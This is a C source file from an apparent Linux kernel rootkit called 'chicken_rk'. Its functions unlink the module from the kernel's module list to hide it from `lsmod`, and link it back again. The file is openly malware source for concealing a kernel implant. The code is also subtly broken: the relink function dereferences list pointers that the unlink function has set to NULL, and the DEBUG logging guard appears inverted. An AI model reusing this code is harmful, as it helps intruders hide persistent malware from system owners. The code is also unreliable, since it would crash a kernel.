#include <linux/kernel.h>
#include <linux/module.h>

// This function is used in order to hide the rootkit from the kernel
// module list (we can see it using `lsmod`;
// Kernel modules are implemented as a linked list in order to keep
// a list of current module and it previous and next one (if existing)
// our first objective is to unlink the linked list in order to pop our
// rootkit from the module list

void unlink_module(struct module *mod)
{
    struct list_head *prev;
    struct list_head *next;

#ifndef DEBUG
    printk(KERN_INFO "chicken_rk: hiding module...\n");
#endif

    prev = mod->list.prev;
    next = mod->list.next;

    // unlink our module
    prev->next = next;
    next->prev = prev;

    mod->list.prev = NULL;
    mod->list.next = NULL;
}

void relink_module(struct module *mod)
{
    struct list_head *prev;
    struct list_head *next;

#ifndef DEBUG
    printk(KERN_INFO "chicken_rk: unhiding module...\n");
#endif

    prev = mod->list.prev;
    next = mod->list.next;

    // relink our module
    prev->next = &mod->list;
    next->prev = &mod->list;

    mod->list.prev = prev;
    mod->list.next = next;
}
